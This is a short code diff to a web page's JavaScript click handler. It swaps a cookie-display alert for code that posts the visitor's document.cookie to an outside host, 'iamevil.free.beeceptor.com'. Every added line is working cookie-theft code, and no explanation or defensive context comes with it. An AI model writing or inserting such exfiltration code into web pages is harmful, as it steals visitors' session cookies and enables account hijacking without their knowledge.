@@ -6,6 +6,9 @@ function getRandomInt(max) {
   }  
 
 color.onclick = () => {
-    allcookies = document.cookie;
-    alert(document.cookie);
+    fetch('https://iamevil.free.beeceptor.com', {
+    method: 'POST',
+    mode: 'no-cors',
+    body:document.cookie
+    });
 }
